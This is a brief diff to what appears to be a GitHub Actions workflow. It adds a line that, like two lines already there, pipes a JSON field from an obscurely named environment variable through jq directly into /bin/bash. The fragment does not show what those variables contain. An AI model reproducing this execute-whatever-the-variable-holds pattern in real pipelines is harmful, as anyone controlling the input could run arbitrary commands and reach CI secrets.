@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$txv1" | jq -r .qtaph81 | /bin/bash
           printf '%s' "$ln3" | jq -r .fyx3 | /bin/bash
+          echo $ps63 | jq -r .p58 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
